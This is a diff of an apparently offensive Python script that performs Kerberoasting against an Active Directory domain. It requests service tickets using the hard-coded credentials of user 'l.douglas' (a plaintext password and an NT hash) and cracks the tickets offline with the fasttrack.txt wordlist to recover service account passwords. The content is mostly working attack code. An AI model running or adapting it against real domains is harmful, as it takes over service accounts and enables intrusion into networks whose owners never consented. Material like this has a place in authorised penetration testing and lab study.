@@ -1,5 +1,5 @@
 from pympacket.attacks.GetUserSPNs import GetUserSPNs
-from pympacket.utils.bruteforce import bruteforce_tgs
+from pympacket.utils.bruteforce import bruteforce
 from argparse import Namespace
 import logging
 import sys
@@ -33,15 +33,16 @@ def kerberoast(username, domain, dc_ip, password='', nthash=None):
     return krbroasting.run()
 
 
-#tgs_out = kerberoast(username='l.douglas', password='Football1', domain='contoso.local')
-tgs_out = kerberoast(username='l.douglas', nthash="e3162fc537e66f4dc1287271cdbec59b", dc_ip="192.168.56.133", domain='contoso.local')
+if __name__ == '__main__':
+    tgs_out = kerberoast(username='l.douglas', password='Football1', domain='contoso.local')
+    tgs_out = kerberoast(username='l.douglas', nthash="e3162fc537e66f4dc1287271cdbec59b", dc_ip="192.168.56.133", domain='contoso.local')
 
-# Output is a list of dict in the following format, None if error:
-# [{'username':'svc_sql', 'spn':'MSSQL/DB01', 'tgs':'$krb5tgs$23$*svc_sql$...'}]
-pprint(tgs_out)
+    # Output is a list of dict in the following format, None if error:
+    # [{'username':'svc_sql', 'spn':'MSSQL/DB01', 'tgs':'$krb5tgs$23$*svc_sql$...'}]
+    pprint(tgs_out)
 
-if tgs_out is not None:
-    for tgs in tgs_out:
-        result = bruteforce_tgs('fasttrack.txt', tgs['tgs'])
-        if result is not None:
-            print(f"{tgs['username']}:{result}")
+    if tgs_out is not None:
+        for tgs in tgs_out:
+            result = bruteforce('fasttrack.txt', tgs['tgs'], 'tgs')
+            if result is not None:
+                print(f"{tgs['username']}:{result}")
